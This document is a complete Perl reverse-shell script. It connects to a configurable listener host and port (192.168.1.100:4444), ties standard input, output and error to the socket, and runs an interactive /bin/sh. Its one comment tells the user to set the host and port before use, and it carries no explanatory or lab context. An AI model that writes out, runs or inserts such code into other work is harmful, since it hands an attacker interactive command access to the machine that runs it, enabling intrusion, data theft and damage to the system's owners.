#!/usr/bin/perl
# Perl Reverse Shell
# Configure LHOST and LPORT before use

use Socket;

$LHOST = "192.168.1.100";
$LPORT = 4444;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(S, sockaddr_in($LPORT, inet_aton($LHOST)));

open(STDIN, ">&S");
open(STDOUT, ">&S");
open(STDERR, ">&S");

exec("/bin/sh -i");